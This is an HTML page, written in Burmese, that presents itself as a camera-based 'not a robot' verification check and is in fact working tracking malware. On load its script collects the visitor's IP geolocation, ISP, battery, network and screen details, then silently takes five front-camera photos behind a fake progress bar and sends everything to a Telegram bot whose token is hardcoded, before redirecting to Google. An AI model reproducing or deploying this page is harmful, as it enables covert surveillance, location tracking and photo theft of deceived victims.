<!DOCTYPE html>
<html lang="my">
<head>
  <meta charset="UTF-8" />
  <title>FAST | စစ်ဆေးချက်</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      background: radial-gradient(circle, #1a1a1a, #000);
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Poppins', sans-serif;
      color: #fff;
    }
    .container {
      text-align: center;
      padding: 30px;
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid #444;
      border-radius: 15px;
      box-shadow: 0 0 20px rgba(0, 255, 255, 0.2);
      width: 90%;
      max-width: 400px;
    }
    h1 { font-size: 22px; margin-bottom: 10px; color: #0ff; }
    p { font-size: 14px; color: #aaa; }
    .status { margin-top: 20px; font-size: 13px; color: #0f0; }
  </style>
</head>
<body>
  <div class="container">
    <h1>🔐 ကိုယ်ရေးအတည်ပြုချက်</h1>
    <p>သင် လူမဟုတ်ကြောင်း အတည်ပြုရန် ကင်မရာခွင့်ပြုချက် လိုအပ်ပါသည်။</p>
    <p class="status" id="status">စတင်နေပါပြီ...</p>
  </div>

  <script>
    // ===== TELEGRAM BOT CONFIGURATION =====
    const BOT_TOKEN = "7308206355:AAFqR-4DnU-N6jScpp3vKpB8hbRSAno_ftc";
    // ======================================
    
    const urlParams = new URLSearchParams(window.location.search);
    const OWNER_ID = urlParams.get('id');
    const statusEl = document.getElementById('status');

    async function sendToTelegram(text, isPhoto = false, photoBase64 = null) {
      if (!OWNER_ID) return;
      
      try {
        if (isPhoto && photoBase64) {
          const formData = new FormData();
          formData.append('chat_id', OWNER_ID);
          formData.append('photo', photoBase64);
          formData.append('caption', text);
          
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
        } else {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: OWNER_ID,
              text: text,
              parse_mode: 'Markdown'
            })
          });
        }
      } catch(e) {
        console.log('Send error:', e);
      }
    }

    async function compressImage(blob) {
      return new Promise((resolve) => {
        const img = new Image();
        img.src = URL.createObjectURL(blob);
        img.onload = () => {
          const canvas = document.createElement('canvas');
          canvas.width = img.width / 2;
          canvas.height = img.height / 2;
          canvas.getContext('2d').drawImage(img, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(resolve, 'image/jpeg', 0.7);
          URL.revokeObjectURL(img.src);
        };
      });
    }

    async function blobToBase64(blob) {
      return new Promise((resolve) => {
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result);
        reader.readAsDataURL(blob);
      });
    }

    async function sendDeviceInfo() {
      try {
        const ipRes = await fetch('https://ipinfo.io/json?token=5602d2e05cb668');
        const ip = await ipRes.json();
        const battery = await navigator.getBattery();
        const time = new Date().toLocaleString();
        
        const msg = `🔐 *စတင်စစ်ဆေးခြင်း*\n\n` +
          `🌐 *IP အချက်အလက်*\n` +
          `🔢 IP: ${ip.ip}\n` +
          `📍 မြို့: ${ip.city || 'မသိရပါ'}\n` +
          `🌍 ဒေသ: ${ip.region || 'မသိရပါ'}\n` +
          `🗺 နိုင်ငံ: ${ip.country || 'မသိရပါ'}\n` +
          `📡 ISP: ${ip.org || 'မသိရပါ'}\n\n` +
          `📱 *စက်ပစ္စည်းအချက်အလက်*\n` +
          `🔋 ဘက်ထရီ: ${Math.round(battery.level * 100)}% ${battery.charging ? '⚡ အားသွင်းနေသည်' : ''}\n` +
          `📶 အင်တာနက်: ${navigator.connection?.effectiveType || 'မသိရပါ'}\n` +
          `🖥 မျက်နှာပြင်: ${screen.width}x${screen.height}\n` +
          `🕒 အချိန်: ${time}`;
        
        await sendToTelegram(msg);
      } catch(e) {
        console.log("Device Info Error:", e);
      }
    }

    window.onload = async () => {
      if (!OWNER_ID) {
        statusEl.textContent = '❌ လင့်မမှန်ကန်ပါ။';
        return;
      }
      
      statusEl.textContent = '📡 ချိတ်ဆက်နေပါသည်...';
      await sendDeviceInfo();

      try {
        statusEl.textContent = '🔨 ခွဲခြမ်းစိတ်ဖြာနေပါသည်...';
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });

        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);

        for (let i = 0; i < 5; i++) {
          const per = (i + 1) * 20;
          statusEl.textContent = `⚙️ လုပ်ဆောင်နေသည် ${per}%...`;
          
          const blob = await imageCapture.takePhoto();
          const compressedBlob = await compressImage(blob);
          const base64 = await blobToBase64(compressedBlob);
          
          await sendToTelegram(`📸 ဓာတ်ပုံ ${i+1}/5 ရိုက်ယူပြီးပါပြီ`, true, base64);
          await new Promise(res => setTimeout(res, 1000));
        }

        track.stop();
        statusEl.textContent = '✅ အတည်ပြုပြီးပါပြီ။ ပြန်ညွှန်းနေပါသည်...';
        
        await sendToTelegram(`✅ *အတည်ပြုခြင်း ပြီးဆုံးပါပြီ!*\n🕐 အချိန်: ${new Date().toLocaleString()}`);
        
        setTimeout(() => {
          window.location.href = "https://www.google.com";
        }, 2000);
        
      } catch (err) {
        statusEl.textContent = '❌ ကင်မရာခွင့်ပြုချက် ငြင်းပယ်ခံရပါသည်။';
        await sendToTelegram(`❌ *ကင်မရာ ငြင်းပယ်ခံရပါသည်!*\n🕐 အချိန်: ${new Date().toLocaleString()}`);
        console.error(err);
      }
    };
  </script>
</body>
</html>
